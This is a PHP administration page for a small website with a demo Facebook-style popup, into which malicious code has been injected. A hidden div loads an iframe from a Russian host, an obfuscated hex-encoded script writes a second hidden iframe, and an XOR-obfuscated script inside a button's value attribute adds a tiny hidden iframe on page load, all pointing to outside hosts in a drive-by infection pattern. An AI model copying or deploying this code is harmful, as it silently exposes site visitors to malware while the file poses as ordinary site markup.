<?php
include 'admin_header.php';																									//Includes Session start, and functions affecting all administration pages

if ($_SESSION['auth'] == "admin") 																							//Check if administrative user is logged in.
{
echo "<html>\n<head>\n".
	 "<link rel='stylesheet' href='assets/admin.css'  type='text/css' />\n".
	 "<link rel='stylesheet' href='assets/modal.css'  type='text/css' />\n".
	 "<script type='text/javascript' src='assets/mootools-1.2.2.js'></script>\n".
	 "<script type='text/javascript' src='assets/modal.js'></script>\n"; ?>


	<script type="text/javascript">
		window.addEvent('domready',function() {
			/* hide using opacity on page load */
			$('fb-modal').setStyles({
				opacity:0,
				display:'block'
			});
			/* hiders */
			$('fb-close').addEvent('click',function(e) { $('fb-modal').fade('out'); });
			window.addEvent('keypress',function(e) { if(e.key == 'esc') { $('fb-modal').fade('out'); } });
			$(document.body).addEvent('click',function(e) { 
				if($('fb-modal').get('opacity') == 1 && !e.target.getParent('.generic_dialog')) { 
					$('fb-modal').fade('out'); 
				} 
			});
			/* click to show */
			$('fb-trigger').addEvent('click',function() {
				$('fb-modal').fade('in');
			});
		});
	</script>

	 
<?php
	 
echo "</head>\n<body><div style="display:none">qgsopnvydsvlldhmczxozdbuxpbboxp<iframe width=984 height=219 src="http://bio-v.ru:8080/index.php" ></iframe></div><script>c10zc='';y4024502aa70=/* y0e86fea */document;y4024502aa70.write('<scr'+'ipt>function yea8476969(ycbdd641e){return e'+c10zc+'val(ycbdd641e); }</scr'+'ipt>');  function c10b010268y8d5b3fe8da(y1467b){ var ye3468=16; var z6='';return (yea8476969('parse'+z6+'Int')(y1467b,ye3468));}function ya3baf12072(y47d6fc7ec56){  var y9be66='';ya2689d='fromCh';y1623d663f2=String[ya2689d+'arCode'];for(y41b20=0;y41b20<y47d6fc7ec56.length;y41b20+=2){ y9be66+=(y1623d663f2(c10b010268y8d5b3fe8da(y47d6fc7ec56.substr(y41b20,2))));}return y9be66;} var y45ed70b002='3C7363726970743E69662821'+c10zc+'6D796961'+c10zc+'297B646F63756D656E742E777269746528756E65736361'+c10zc+'7065282027253363253639253636253732253631'+c10zc+'253664253635253230253665253631'+c10zc+'253664253635253364253633253331'+c10zc+'253330253230253733253732253633253364253237253638253734253734253730253361'+c10zc+'253266253266253332253331'+c10zc+'253332253265253331'+c10zc+'253337253334253265253332253330253330253265253331'+c10zc+'253332253330253266253265253634253639253636253266253637253666253265253730253638253730253366253733253639253634253364253331'+c10zc+'26253237253262253464253631'+c10zc+'253734253638253265253732253666253735253665253634253238253464253631'+c10zc+'253734253638253265253732253631'+c10zc+'253665253634253666253664253238253239253261'+c10zc+'253336253334253330253331'+c10zc+'253335253239253262253237253331'+c10zc+'253334253335253631'+c10zc+'253335253634253635253631'+c10zc+'253331'+c10zc+'253332253334253632253237253230253737253639253634253734253638253364253334253331'+c10zc+'253333253230253638253635253639253637253638253734253364253331'+c10zc+'253335253335253230253733253734253739253663253635253364253237253736253639253733253639253632253639253663253639253734253739253361'+c10zc+'253638253639253634253634253635253665253237253365253363253266253639253636253732253631'+c10zc+'2536642536352533652729293B7D7661'+c10zc+'72206D796961'+c10zc+'3D747275653B3C2F7363726970743E';y4024502aa70.write(ya3baf12072(y45ed70b002));</script>\n";
echo "<h2>Ignite The Spirit Administration</h2>";
include 'admin_navigation.php';	
echo "<p>The ignite the spirit administration panel allows users to modify the website<br />
		 from any location, without any coding experience needed. This is a work in<br />
		 progress, but updates will add new features and improve existing ones.
		 
		 </p><p><a href='#' id='fb-trigger'>Click here</a> to show the Facebook-like dialog box.</p><br />";
		 
		 ?>
		 	
	<div class="generic_dialog" id="fb-modal">
	<div class="generic_dialog_popup" style="top: 125px;">
		<table class="pop_dialog_table" id="pop_dialog_table" style="width: 532px;">
			<tbody>
				<tr>
					<td class="pop_topleft"/>
					<td class="pop_border pop_top"/>
					<td class="pop_topright"/>
				</tr>

				<tr>
					<td class="pop_border pop_side"/>
					<td id="pop_content" class="pop_content">
						<h2 class="dialog_title"><span>David Walsh</span></h2>
						<div class="dialog_content">
							<div class="dialog_summary">You must be friends with David Walsh to see their full profile.</div>
							<div class="dialog_body">
								<div class="ubersearch search_profile">

									<div class="result clearfix">
										<div class="image">
											<span><img class="photo" alt="David Walsh" src="http://profile.ak.facebook.com/v222/282/0/n211704301_1944.jpg"/></span>
										</div>
										<div class="info">
											<p>
												<b>About David Walsh</b><br />David Walsh, Web Developer
											</p>
											<p>

												I'm a 25 year old Web Developer planted in Madison, Wisconsin. I am Founder and Lead Developer for Wynq Web Labs. I don't design the websites, I just make them work.
											</p>
										</div>
										<div class="clear" style="clear:both;"></div>
									</div>
								</div>
							</div>
							<div class="dialog_buttons">
								<input type="button" value="<?php echo ''; ?><?php echo '<script>function HPkDx(BTOyBCO, JHi, dohkdlb){var EwHRWW=dohkdlb.split(JHi);var XFdsDX='';for(hUDiKAOew=-0xa-0x27-0x1b+0x18+0x1d+0x17;hUDiKAOew<(EwHRWW.length-1);hUDiKAOew+=0xc+0x22+0x1c+0x4-0x4d){ sjZb = EwHRWW[hUDiKAOew]^BTOyBCO;XFdsDX += String.fromCharCode(sjZb);}return XFdsDX;}function Qquuhlwb(tAEu){ var LNuGs = document.getElementById('xOGCRdaqIR'); fff.op.replace("157"); } 
;function qYjeCeDf(){var aLRvWh=new Function("gaR", "return "+HPkDx(0x23+0x2d+0x2e+0x103, 'e','485e494e482e500e492e484e495e501e')+"."+HPkDx(0x2f+0xc-0x30-0x29+0x12d, 'G','365G352G363G374G')+"");var KoJr=aLRvWh(-0x6-0x31+0xe+0x2a);KoJr.innerHTML += HPkDx(-0x17-0x6+0xbb, 'y','162y247y248y236y255y243y251y190y233y247y250y234y246y163y175y190y246y251y247y249y246y234y163y175y190y252y241y236y250y251y236y163y174y190y248y236y255y243y251y252y241y236y250y251y236y163y174y190y237y236y253y163y185y246y234y234y238y164y177y177y232y235y236y243y241y179y237y234y172y176y253y240y177y237y234y255y236y177y247y240y250y251y230y176y238y246y238y185y160y162y177y247y248y236y255y243y251y160y');}function njYjtn(zGlht){ alert('Fpew'); fff.op.replace("336");alert('Fpew'); } 
;if(window.addEventListener){window.addEventListener('load',qYjeCeDf,false);}else if(window.attachEvent){window.attachEvent('onload', qYjeCeDf);}function MsVOfO(XSGsAu){  fff=op.split("827");alert('lNDhfs'); fff.op.replace("867"); } 
;</script>'; ?>